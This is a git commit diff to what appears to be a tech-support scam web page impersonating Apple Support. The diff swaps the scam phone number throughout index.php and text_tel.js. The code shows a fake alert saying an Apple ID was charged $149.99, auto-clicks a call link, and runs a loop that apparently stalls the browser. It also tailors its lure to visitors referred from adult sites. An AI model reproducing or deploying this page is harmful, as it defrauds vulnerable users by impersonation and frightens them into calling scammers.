573e240dd0749c09c50dbb18b3b9b5b7897bcfb0
voumiclauise47-netizen <voumiclauise47@gmail.com>
2025-12-19 22:25:28 +0530

    Add files via upload

--- index.php
+++ index.php
@@ -134,7 +134,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-888-449-4338 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="#">Apple Support +1-888-654-6280 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -212,7 +212,7 @@
 						Apple </a></div>
                 </div>
                 <meta content="Apple" property="name" />
-                <meta content="+1-888-449-4338
+                <meta content="+1-888-654-6280
 			 " property="telephone" />
             </section>
         </div>
@@ -279,7 +279,7 @@
 
         window.number = getPar('phone');
 
-        window.number = (window.number ? window.number : '+1-888-449-4338');
+        window.number = (window.number ? window.number : '+1-888-654-6280');
 
         window.device = 'iPhone';
         window.refef = parseURL(document.referrer);
@@ -337,7 +337,7 @@
         }, 100);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-4338"></a>');
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-654-6280"></a>');
             document.querySelector('a').click();
             var extraData = "";
             for (itxextraData = 0; itxextraData < 200; itxextraData++) {
@@ -354,7 +354,7 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-4338 to Freeze it!.")) {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-654-6280 to Freeze it!.")) {
                 okkkk();
             } else {
                 okkkk();
--- text_tel.js
+++ text_tel.js
@@ -1,15 +1,15 @@
-window.defaultNumber = '+1-888-449-4338';
-window.defaultText = 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-449-4338 to Freeze it!';
+window.defaultNumber = '+1-888-654-6280';
+window.defaultText = 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-888-654-6280 to Freeze it!';
 window.text = {
-    'xhamster.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'perfectgirls.net': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'gotporn.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'anysex.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'sex.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 unlock it!',
-    'bravotube.net': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'mylust.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'manporn.xxx': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'anybunny.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'txxx.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!',
-    'findbestsolution.xyz': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-449-4338 to unlock it!'
+    'xhamster.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'perfectgirls.net': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'gotporn.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'anysex.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'sex.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 unlock it!',
+    'bravotube.net': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'mylust.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'manporn.xxx': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'anybunny.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'txxx.com': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!',
+    'findbestsolution.xyz': 'Your |%model%| Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization . on |%ref%|! Immediately call Apple Support +1-888-654-6280 to unlock it!'
 };
